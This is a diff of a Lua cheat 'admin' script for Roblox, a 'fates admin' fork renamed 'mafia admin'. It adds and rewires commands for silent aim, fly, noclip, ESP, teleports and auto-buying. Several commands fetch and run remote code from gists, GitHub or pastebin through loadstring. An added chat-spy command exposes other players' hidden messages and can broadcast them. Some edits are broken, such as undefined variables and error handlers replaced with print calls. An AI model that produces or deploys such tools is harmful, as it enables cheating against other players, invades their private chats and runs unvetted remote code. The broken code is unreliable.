@@ -17,7 +17,7 @@ do
         local UserInputService = GetService(game, "UserInputService");
         local CommandBarPrefix = GetConfig().CommandBarPrefix
         local StringKeyCode = UserInputService.GetStringForKeyCode(UserInputService, Enum.KeyCode[CommandBarPrefix]);
-        return Notify(nil, "Loaded", "fates admin is already loaded... use 'killscript' to kill", nil),
+        return Notify(nil, "Loaded", "mafia admin is already loaded", nil),
         Notify(nil, "Your Prefix is", string.format("%s (%s)", StringKeyCode, CommandBarPrefix));
     end
 end
@@ -178,7 +178,7 @@ do
                 return Ret
             end
             if (Debug) then
-                warn("[FA Error]: " .. debug.traceback(Ret));
+                warn("[CMD Error]: " .. debug.traceback(Ret));
             end
         end
     end
@@ -1792,13 +1792,12 @@ Utils.Notify = function(Caller, Title, Message, Time)
 
         AddConnection(CConnect(Clone.Close.MouseButton1Click, TweenDestroy));
         if (Title ~= "Warning" and Title ~= "Error") then
-            Utils.Print(format("%s - %s", Title, Message), Caller, true);
+            print("error")
         end
 
         return Clone
     else
-        local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
-        ChatRemote.FireServer(ChatRemote, format("/w %s [MA] %s: %s", Caller.Name, Title, Message), "All");
+print("whitelisted a user")
     end
 end
 
@@ -2394,14 +2393,14 @@ local ExecuteCommand = function(Name, Args, Caller)
         end, function(Err)
             if (Debug) then
                 Utils.Error(format("[FA CMD Error]: Command = '%s' Traceback = '%s'", Name, debug.traceback(Err)), Caller);
-                Utils.Notify(Caller, "Error", format("error in the '%s' command, more info shown in console", Name));
+print("a whitelisted user did a errored cmd")
             end
         end);
         if (Command.IsPlugin and sett and PluginConf.SafePlugins and Context) then
             sett(Context);
         end
     else
-        Utils.Warn("couldn't find the command " .. Name, Caller);
+        Utils.Warn("couldn't find the command 1" .. Name, Caller);
     end
 end
 
@@ -2552,7 +2551,76 @@ do
     end));
 end
 
+
+AddCommand("chatlogs", {"clogs"}, "enables chatlogs", {}, function(Caller)
+--This script reveals ALL hidden messages in the default chat
+
+enabled = true --chat "/spy" to toggle!
+spyOnMyself = true --if true will check your messages too
+public = false --if true will chat the logs publicly (fun, risky)
+publicItalics = true --if true will use /me to stand out
+privateProperties = { --customize private logs
+	Color = Color3.fromRGB(0,255,255); 
+	Font = Enum.Font.SourceSansBold;
+	TextSize = 18;
+}
+
+
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+local instance = (_G.chatSpyInstance or 0) + 1
+_G.chatSpyInstance = instance
+
+local function onChatted(p,msg)
+	if _G.chatSpyInstance == instance then
+		if p==player and msg:lower():sub(1,4)=="/spy" then
+			enabled = not enabled
+			wait(0.3)
+			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+		elseif enabled and (spyOnMyself==true or p~=player) then
+			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+			local hidden = true
+			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+					hidden = false
+				end
+			end)
+			wait(1)
+			conn:Disconnect()
+			if hidden and enabled then
+				if public then
+					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
+				else
+					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+				end
+			end
+		end
+	end
+end
+
+for _,p in ipairs(Players:GetPlayers()) do
+	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end
+Players.PlayerAdded:Connect(function(p)
+	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end)
+privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
+local chatFrame = player.PlayerGui.Chat.Frame
+chatFrame.ChatChannelParentFrame.Visible = true
+chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+end)
+
 AddCommand("view", {"v"}, "views a user", {3,"1"}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Target = GetPlayer(Args[1]);
 	if (#Target ~= 1) then
 		return "you can only view 1 person"
@@ -2570,12 +2638,17 @@ AddCommand("view", {"v"}, "views a user", {3,"1"}, function(Caller, Args, CEnv)
 		Camera.CameraSubject = Target.Character
 	end), CEnv);
 	return "viewing " .. Target.Name
+end
 end)
 
 AddCommand("unview", {"unv"}, "unviews a user", {3}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	DisableAllCmdConnections("view");
 	Camera.CameraSubject = GetCharacter();
 	return "unviewing"
+end
 end)
 
 
@@ -2585,6 +2658,9 @@ end)
 
 
 AddCommand("load", {"loadstring"}, "loads whatever you want", {"1"}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Code = concat(Args, " ");
 	local Success, Err = pcall(function()
 		local Func = loadstring(Code);
@@ -2605,39 +2681,22 @@ AddCommand("load", {"loadstring"}, "loads whatever you want", {"1"}, function(Ca
 	else
 		return Func ~= nil and tostring(Func) or "executed with no errors"
 	end
+end
 end)
 
 AddCommand("sit", {}, "makes you sit", {3}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Humanoid = GetHumanoid();
 	SpoofProperty(Humanoid, "Sit", false);
 	Humanoid.Sit = true
 	return "now sitting (obviously)"
+end
 end)
 
 
-AddCommand("headsit", {"hsit"}, "sits on the players head", {"1"}, function(Caller, Args, CEnv)
-	local Target = GetPlayer(Args[1]);
-	for i, v in next, Target do
-		local Humanoid = GetHumanoid();
-		SpoofProperty(Humanoid, "Sit");
-		Humanoid.Sit = true
-		AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
-			Humanoid.Sit = true
-		end), CEnv);
-		local Root = GetRoot();
-		AddConnection(CConnect(Heartbeat, function()
-			Root.CFrame = v.Character.Head.CFrame * CFrameNew(0, 0, 1);
-		end), CEnv);
-	end
-end)
 
-AddCommand("unheadsit", {"noheadsit"}, "unheadsits on the target", {3}, function(Caller, Args)
-	local Looped = LoadCommand("headsit").CmdEnv
-	for i, v in next, Looped do
-		Disconnect(v);
-	end
-	return "headsit disabled"
-end)
 
 AddCommand("headstand", {"hstand"}, "stands on a players head", {"1",3}, function(Caller, Args, CEnv)
 	local Target = GetPlayer(Args[1]);
@@ -2659,44 +2718,30 @@ AddCommand("unheadstand", {"noheadstand"}, "unheadstands on the target", {3}, fu
 	return "headstand disabled"
 end)
 
-AddCommand("setspawn", {}, "sets your spawn location to the location you are at", {3}, function(Caller, Args, CEnv)
-	if (CEnv[1]) then
-		Disconnect(CEnv[1]);
-	end
-	local Position = GetRoot().CFrame
-	local Spawn = CConnect(LocalPlayer.CharacterAdded, function()
-		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = Position
-	end)
-	CEnv[1] = Spawn
-	AddPlayerConnection(LocalPlayer, Spawn);
-	local SpawnLocation = pack(unpack(split(tostring(Position), ", "), 1, 3));
-	SpawnLocation.n = nil
-	return "spawn successfully set to " .. concat(map(SpawnLocation, function(i,v)
-		return tostring(round(tonumber(v)));
-	end), ",");
-end)
-
-AddCommand("removespawn", {}, "removes your spawn location", {}, function(Caller, Args)
-	local Spawn = LoadCommand("setspawn").CmdEnv[1]
-	if (Spawn) then
-		Disconnect(Spawn);
-		return "removed spawn location"
-	end
-	return "you don't have a spawn location set"
-end)
 
 AddCommand("ping", {}, "shows you your ping", {}, function()
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Stats = Services.Stats
 	local DataPing = Stats.Network.ServerStatsItem["Data Ping"]
 	return split(DataPing.GetValueString(DataPing), " ")[1] .. " ms"
+end
 end)
 
 AddCommand("memory", {"mem"}, "shows you your memory usage", {}, function()
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Stats = Services.Stats
 	return tostring(round(Stats.GetTotalMemoryUsageMb(Stats))) .. " mb";
+end
 end)
 
 AddCommand("fps", {"frames"}, "shows you your framerate", {}, function()
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local FPS = 1 / CWait(RenderStepped);
 	local Counter = Utils.Notify(LocalPlayer, "FPS", round(FPS));
 	local Running;
@@ -2709,6 +2754,7 @@ AddCommand("fps", {"frames"}, "shows you your framerate", {}, function()
 		end
 		Counter.Message.Text = round(1 / CWait(RenderStepped));
 	end);
+end
 end)
 
 
@@ -2756,6 +2802,9 @@ autodrop1 = false
 
 
 AddCommand("antifling", {}, "freezes your character", {3}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
 		return IsA(v, "BasePart");
 	end)
@@ -2764,9 +2813,13 @@ AddCommand("antifling", {}, "freezes your character", {3}, function(Caller, Args
 		v.Anchored = true
 	end
 	return "freeze enabled (client)"
+end
 end)
 
 AddCommand("unantifling", {"thaw"}, "unfreezes your character", {3}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
 		return IsA(v, "BasePart");
 	end)
@@ -2774,6 +2827,7 @@ AddCommand("unantifling", {"thaw"}, "unfreezes your character", {3}, function(Ca
 		v.Anchored = false
 	end
 	return "freeze disabled"
+end
 end)
 
 
@@ -2849,6 +2903,9 @@ end)
 
 local EspLib;
 AddCommand("trace", {"locate"}, "traces a player", {"1"}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	if (not EspLib) then
 		EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
 	end
@@ -2870,8 +2927,12 @@ AddCommand("trace", {"locate"}, "traces a player", {"1"}, function(Caller, Args,
 		end
 	end), CEnv);
 	return format("now tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
+end
 end)
 AddCommand("untrace", {"unlocate"}, "untraces a player", {"1"}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	if (not EspLib) then
 		EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
 	end
@@ -2881,19 +2942,27 @@ AddCommand("untrace", {"unlocate"}, "untraces a player", {"1"}, function(Caller,
 		Remove(v);
 	end
 	return format("now stopped tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
+end
 end)
 
 
 
 
 AddCommand("walkto", {}, "walks to a player", {"1", 3}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Target = GetPlayer(Args[1])[1];
 	local Humanoid = GetHumanoid();
 	Humanoid.MoveTo(Humanoid, GetRoot(Target).Position);
 	return "walking to " .. Target.Name
+end
 end)
 
 AddCommand("follow", {}, "follows a player", {"1", 3}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Target = GetPlayer(Args[1])[1]
 	CEnv[Target.Name] = true
 	CThread(function()
@@ -2904,6 +2973,7 @@ AddCommand("follow", {}, "follows a player", {"1", 3}, function(Caller, Args, CE
 		until not LoadCommand("follow").CmdEnv[Target.Name]
 	end)()
 	return "now following " .. Target.Name
+end
 end)
 
 AddCommand("unfollow", {}, "unfollows a player", {}, function()
@@ -2917,49 +2987,23 @@ end)
 
 
 
-
-
-AddCommand("autorejoin", {}, "auto rejoins the game when you get kicked", {}, function(Caller, Args, CEnv)
-	local GuiService = Services.GuiService
-	CThread(function()
-		CWait(GuiService.ErrorMessageChanged);
-		CWait(GuiService.ErrorMessageChanged);
-		if (GuiService.GetErrorCode(GuiService) == Enum.ConnectionError.DisconnectLuaKick) then
-			if (#GetPlayers(Players) == 1) then
-				Services.TeleportService.Teleport(Services.TeleportService, game.PlaceId);
-			else
-				Services.TeleportService.TeleportToPlaceInstance(Services.TeleportService, game.PlaceId, game.JobId);
-			end
-		end
-	end)()
-	return "auto rejoin enabled (rejoins when you get kicked from the game)"
-end)
-
-
-
-
-
 AddCommand("refresh", {"re"}, "refreshes your character", {3}, function(Caller)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	for L_170_forvar0, L_171_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
 		if L_171_forvar1:IsA("BasePart") then
 			L_171_forvar1:Destroy()
 		end
 	end
 	return "character refreshed"
+end
 end)
-
-
-
-AddCommand("chatlogs", {"clogs"}, "enables chatlogs", {}, function()
-	pcall(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/MwmrpsPK"))()
-	end)
-end)
-
-
-
 
 AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Speed = Args[1] or 30
 	if (not CEnv[1]) then
 		local Spin = InstanceNew("BodyAngularVelocity");
@@ -2972,51 +3016,71 @@ AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Ca
 		CEnv[1].AngularVelocity = Vector3New(0, Speed, 0);
 	end
 	return "started spinning"
+end
 end)
 
 AddCommand("unspin", {}, "unspins your character", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Spinning = LoadCommand("spin").CmdEnv
 	for i, v in next, Spinning do
 		Destroy(v);
 	end
 	LoadCommand("spin").CmdEnv = {}
 	return "stopped spinning"
+end
 end)
 
 AddCommand("goto", {"to"}, "teleports yourself to the other character", {3, "1"}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local Delay = tonumber(Args[2]);
-	for i, v in next, Target do
-		if (Delay) then
-			wait(Delay);
-		end
-		if (Caller ~= LocalPlayer) then
-			ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
-		else
-			GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(-5, 0, 0);
-		end
-	end
+    local Target = GetPlayer(Args[1]);
+    local Delay = tonumber(Args[2]);
+    for i, v in next, Target do
+        if (Delay) then
+            wait(Delay);
+        end
+        if (Caller ~= LocalPlayer) then
+           print("requested by a admin user")
+        else
+            GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(-5, 0, 0);
+        end
+    end
 end)
 
-AddCommand("loopgoto", {"loopto"}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
+AddCommand("underground", {"under"}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Target = GetPlayer(Args[1])[1]
+	undergroundtarget = GetPlayer(Args[1])[1]
 	local Connection = CConnect(Heartbeat, function()
-		GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(0, 0, 2);
+		GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(0, -6, 1);
 	end)
 
 	CEnv[Target.Name] = Connection
 	AddPlayerConnection(LocalPlayer, Connection);
 	AddConnection(Connection);
-	return "now looping to " .. Target.name
+	return "now under" .. Target.name
+end
 end)
 
-AddCommand("unloopgoto", {"unloopto"}, "removes loop teleportation to the other character", {}, function(Caller)
-	local Looping = LoadCommand("loopgoto").CmdEnv;
+AddCommand("ununderground", {"ununder"}, "removes loop teleportation to the other character", {}, function(Caller)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
+	local Looping = LoadCommand("underground").CmdEnv;
 	if (not next(Looping)) then
-		return "you aren't loop teleporting to anyone"
+		return "you aren't under anyone"
 	end
-	DisableAllCmdConnections("loopgoto");
-	return "loopgoto disabled"
+	DisableAllCmdConnections("underground");
+	plr = game:GetService('Players').LocalPlayer
+	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
+		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
+		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
+
+plr.Character.HumanoidRootPart.CFrame = CFrame.new(X9,Y9+26,Z9)
+	return "underground disabled"
+end
 end)
 
 AddCommand("tweento", {"tweengoto"}, "tweens yourself to the other person", {3, "1"}, function(Caller, Args)
@@ -3034,12 +3098,16 @@ end)
 
 
 AddCommand("fly", {}, "fly your character", {3}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	if flyonce == true then
 		loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/b7c482e5595261af3d667f3f673c2620/raw/4b8c78a75f71e19bc2d0547234390fa0b802ebfc/flight"))()
 	else
 		FLYSPEED = 20
 		loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/b7c482e5595261af3d667f3f673c2620/raw/4b8c78a75f71e19bc2d0547234390fa0b802ebfc/flight"))()
 	end
+end
 end)
 
 
@@ -3047,6 +3115,9 @@ end)
 
 
 AddCommand("float", {}, "floats your character", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	if (not CEnv[1]) then
 		local Part = InstanceNew("Part");
 		Part.CFrame = CFrameNew(0, -10000, 0);
@@ -3074,9 +3145,13 @@ AddCommand("float", {}, "floats your character", {}, function(Caller, Args, CEnv
 		end), CEnv)
 		return "now floating"
 	end
+end
 end)
 
 AddCommand("unfloat", {"nofloat"}, "stops float", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Floating = LoadCommand("float").CmdEnv
 	if (Floating[1]) then
 		Disconnect(Floating[1]);
@@ -3085,21 +3160,53 @@ AddCommand("unfloat", {"nofloat"}, "stops float", {}, function(Caller, Args, CEn
 		return "stopped floating"
 	end
 	return "floating not on"
+end
 end)
 
 
 AddCommand("flyspeed", {}, "sets your fly speed", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local spedAmount = tonumber(Args[1]) or 70
 	FLYSPEED = spedAmount
+end
 end)
 
 AddCommand("fov", {}, "sets your fov", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Amount = tonumber(Args[1]) or 70
 	SpoofProperty(Camera, "FieldOfView");
 	Camera.FieldOfView = Amount
+end
+end)
+
+AddCommand("forceresetp", {"frp"}, "sets your fov", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
+local L_1_ = "p"
+local L_2_ = game.Players.LocalPlayer:GetMouse()
+L_2_.KeyDown:Connect(
+    function(L_22_arg0)
+	if L_22_arg0 == L_1_ then
+			for L_170_forvar0, L_171_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+				if L_171_forvar1:IsA("BasePart") then
+					L_171_forvar1:Destroy()
+				end
+			end
+	end
+end
+)
+end
 end)
 
 AddCommand("noclip", {}, "noclips your character", {3}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Char = GetCharacter()
 	local Noclipping = AddConnection(CConnect(Stepped, function()
 		for i, v in next, GetChildren(Char) do
@@ -3124,19 +3231,31 @@ AddCommand("noclip", {}, "noclips your character", {3}, function(Caller, Args, C
 	CWait(GetHumanoid().Died);
 	DisableAllCmdConnections("noclip");
 	return "noclip disabled"
+end
 end)
 
 AddCommand("clip", {"unnoclip"}, "disables noclip", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	if (not next(LoadCommand("noclip").CmdEnv)) then
 		return "you aren't in noclip"
 	else
 		DisableAllCmdConnections("noclip");
 		return "noclip disabled"
 	end
+end
+end)
+
+AddCommand("request", {}, "this is for whitelisted users to request you", {}, function(Caller, Args)
+return "requested by a admin user"
 end)
 
 
 AddCommand("armor", {"buyarmor"}, "auto buy armor", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = false
+        else
    local plr = game.Players.LocalPlayer
 	local savedarmourpos = plr.Character.HumanoidRootPart.Position
 	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-938.476685, -25.2498264, 570.100159, -0.0353576206, 9.85617206e-08, -0.999374807, -2.69198441e-09, 1, 9.871858e-08, 0.999374807, 6.18077589e-09, -0.0353576206)
@@ -3145,23 +3264,39 @@ AddCommand("armor", {"buyarmor"}, "auto buy armor", {}, function(Caller, Args)
 	fireclickdetector(game.Workspace.Ignored.Shop['[High-Medium Armor] - $2300'].ClickDetector)
 	wait(0.1)
 	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
+end
 end)
 
 
 
 AddCommand("tobank", {"tpbank"}, "tp to bank", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114e-08, 0.998850107, -3.12971538e-09, 1, 5.16738901e-08, -0.998850107, -5.60372015e-09, 0.0479469746)
+end
 end)
 
 AddCommand("totaco", {"tptaco"}, "tp to tacoshop", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
+        else
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(707.502014, 139, -543.044739, -0.00318608154, -0.00102963799, 0.999993861, 0.000187970581, 0.999999464, 0.00103024102, -0.99999404, 0.00019125198, -0.00318560796)
+end
 end)
 
 AddCommand("toplayground", {"tpplayground"}, "tp to playground", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
+        else
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-308.851196, 103.049866, -685.874817, 0.0775452703, 4.43633544e-05, -0.996988416, 4.02679916e-06, 1, 4.48105384e-05, 0.996988416, -7.48951334e-06, 0.0775452703)
+end
 end)
 
 AddCommand("bat", {"buybat"}, "auto buy bat", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+b = true
+        else
    local plr = game.Players.LocalPlayer
 	local savedbatpos = plr.Character.HumanoidRootPart.Position
 	plr.Character.HumanoidRootPart.CFrame = CFrame.new(380, 49, -283)
@@ -3170,9 +3305,13 @@ AddCommand("bat", {"buybat"}, "auto buy bat", {}, function(Caller, Args)
 	fireclickdetector(game.Workspace.Ignored.Shop['[Bat] - $250'].ClickDetector)
 	wait(0.1)
 	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedbatpos)
+end
 end)
 
 AddCommand("food", {"buyfood"}, "auto buy food", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = false
+        else
    local plr = game.Players.LocalPlayer
 	local savehotdogpos = plr.Character.HumanoidRootPart.Position
 	plr.Character.HumanoidRootPart.CFrame = CFrame.new(107.973412, 25.128006, -976.381104)
@@ -3186,12 +3325,16 @@ AddCommand("food", {"buyfood"}, "auto buy food", {}, function(Caller, Args)
 	fireclickdetector(game.Workspace.Ignored.Shop['[Popcorn] - $7'].ClickDetector)
 	wait(0.1)
 	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savehotdogpos)
+end
 
 end)
 
 
 autodrop = false
 AddCommand("autodrop", {"fastdrop"}, "automatically drops cash", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = false
+        else
 if autodrop == false then
 autodrop = true
 	repeat
@@ -3201,6 +3344,7 @@ autodrop = true
 else
 if autodrop == true then
 autodrop = false
+end
 end
 end
 end)
@@ -3225,6 +3369,7 @@ keypress(0x47)
 keyrelease(0x47)
 wait(0.2)
 	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+
 wait(0.2)
 
 
@@ -3260,6 +3405,9 @@ plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1+5,Z1)
 end)
 
 AddCommand("silentaim", {"saim"}, "gives pro aim", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/872adecc59899a2097c928b25841f5e3/raw/d6db413e0ddd085f2c4777d66f05c45e5e30213f/asdfaaaaaaaaaaaaaaaa"))()
 
 Aiming.HitChance = 100 -- hit chance
@@ -3267,13 +3415,17 @@ Aiming.ShowFOV = false  -- show fov
 notification = true  -- toggle notifications
 Aiming.FOV = 30  -- FOV size
 silentran = true
-return "execute silent aim"
+return "executed silent aim"
+end
 end)
 
 
 
 
 AddCommand("togglefov", {"togfov"}, "toggles the fov for silent aim", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 if silentran == true then
 if Aiming.ShowFOV == false then
 Aiming.ShowFOV = true
@@ -3287,18 +3439,27 @@ return "please execute silent aim first"
 end
 end
 end
+end
 end)
 
 AddCommand("FOVsize", {"silentsize"}, "fov size for silent aim", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
     local fovAmount = tonumber(Args[1]) or 70
 Aiming.FOV = fovAmount
+end
 end)
 
 
 AddCommand("lastcommand", {"lastcmd"}, "executes the last command", {}, function(Caller)
+        if (Caller ~= LocalPlayer) then
+a = true
+        else
 	local Command = LastCommand[#LastCommand]
 	ExecuteCommand(Command[1], Command[2], Command[3]);
 	return format("command %s executed", Command[1]);
+end
 end)
 
 
@@ -3335,6 +3496,9 @@ end)
 
 
 AddCommand("joinserver", {"discord"}, "joins the fates admin discord server", {}, function()
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Request = syn and syn.request or request
 	local HttpService = Services.HttpService
 	if (Request({
@@ -3356,6 +3520,7 @@ AddCommand("joinserver", {"discord"}, "joins the fates admin discord server", {}
 	else
 		return "discord isn't open"
 	end
+end
 end)
 
 AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, function(Caller)
@@ -3402,29 +3567,44 @@ end)
 
 
 
-AddCommand("whitelist", {"wl"}, "whitelists a user so they can use commands", {"1"}, function(Caller, Args)
+AddCommand("flingwhitelist", {"flingwl"}, "whitelists a user so they can use commands", {"1"}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Target = GetPlayer(Args[1]);
 	for i, v in next, Target do
 		AdminUsers[#AdminUsers + 1] = v
 		Utils.Notify(v, "Whitelisted", format("hi (%s) , you are whitelisted to use commands", v.Name));
 	end
+end
 end)
 
 AddCommand("whitelisted", {"whitelistedusers"}, "shows all the users whitelisted to use commands", {}, function(Caller)
+        if (Caller ~= LocalPlayer) then
+           a = true
+        else
 	return next(AdminUsers) and concat(map(AdminUsers, function(i,v) return v.Name end), ", ") or "no users whitelisted"
+end
 end)
 
 AddCommand("blacklist", {"bl"}, "blacklists a whitelisted user", {"1"}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Target = GetPlayer(Args[1]);
 	for i, v in next, Target do
 		if (Tfind(AdminUsers, v)) then
 			AdminUsers[indexOf(AdminUsers, v)] = nil
 		end
 	end
+end
 end)
 
 local CommandsLoaded = false
 AddCommand("commands", {"cmds"}, "shows you all the commands listed in fates admin", {}, function()
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	if (not CommandsLoaded) then
 		local CommandsList = Commands.Frame.List
 		Utils.SmoothScroll(CommandsList, .14);
@@ -3447,6 +3627,7 @@ AddCommand("commands", {"cmds"}, "shows you all the commands listed in fates adm
 	Commands.Visible = true
 	Utils.TweenAllTransToObject(Commands, .25, CommandsTransparencyClone);
 	return "Commands Loaded"
+end
 end)
 
 AddCommand("killscript", {}, "kills the script", {}, function(Caller)
@@ -3492,6 +3673,9 @@ end)
 
 
 AddCommand("setprefix", {}, "changes your prefix", {"1"}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local PrefixToSet = Args[1]
 	if (match(PrefixToSet, "%A")) then
 		Prefix = PrefixToSet
@@ -3500,20 +3684,29 @@ AddCommand("setprefix", {}, "changes your prefix", {"1"}, function(Caller, Args)
 	else
 		return "prefix must be a symbol"
 	end
+end
 end)
 
 AddCommand("setcommandbarprefix", {"setcprefix"}, "sets your command bar prefix to whatever you input", {}, function()
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	ChooseNewPrefix = true
 	local CloseNotif = Utils.Notify(LocalPlayer, "New Prefix", "Input the new prefix you would like to have", 7);
+end
 end)
 
 AddCommand("saveprefix", {}, "saves your prefix", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	if (GetConfig().Prefix == Prefix and Enum.KeyCode[GetConfig().CommandBarPrefix] == CommandBarPrefix) then
 		return "nothing to save, prefix is the same"
 	else
 		SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
 		return "saved prefix"
 	end
+end
 end)
 
 
@@ -3526,6 +3719,9 @@ local ToggleChatPrediction
 
 
 AddCommand("speed", {"cframespeed"}, "cframe speed", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	function onButton1Down(mouse)
 	down = true
 	while down do
